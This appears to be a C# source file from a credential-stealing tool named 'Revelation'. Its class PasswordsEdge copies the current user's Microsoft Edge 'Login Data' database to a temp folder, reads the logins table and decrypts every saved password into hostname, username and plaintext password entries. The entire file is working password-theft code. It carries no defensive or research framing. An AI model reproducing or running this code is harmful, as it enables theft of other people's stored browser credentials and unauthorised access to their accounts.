using Revelation.common;
using Revelation.passwords.utils_chrome_edge;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Revelation.passwords
{
    internal class PasswordsEdge
    {

        public static string browser = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Microsoft\Edge\User Data\";
        public static string EdgeBrowserPasswordsPath = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data";
        public static List<Password> Get()
        {
            List<Password> passwords = new List<Password>();
            if (!PasswordsExists()) throw new FileNotFoundException("Cant find password store", EdgeBrowserPasswordsPath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found

            var tempDatabaseLocation = Environment.GetEnvironmentVariable("temp") + "\\browserEdgePasswords";
            if (File.Exists(tempDatabaseLocation))
            {
                File.Delete(tempDatabaseLocation);
            }
            File.Copy(EdgeBrowserPasswordsPath, tempDatabaseLocation);

            SQLite sSQLite = new SQLite(tempDatabaseLocation);
            sSQLite.ReadTable("logins");

            for (int i = 0; i < sSQLite.GetRowCount(); i++)
            {
                // Get data from database

                passwords.Add(new Password()
                {
                    hostname = sSQLite.GetValue(i, 7),
                    username = sSQLite.GetValue(i, 3),
                    password = Crypt.GetUTF8(Crypt.decrypt(sSQLite.GetValue(i, 5), browser))
                });


            }
            return passwords;
        }
        public static bool PasswordsExists()
        {
            if (File.Exists(EdgeBrowserPasswordsPath))
                return true;
            return false;
        }
    }
}
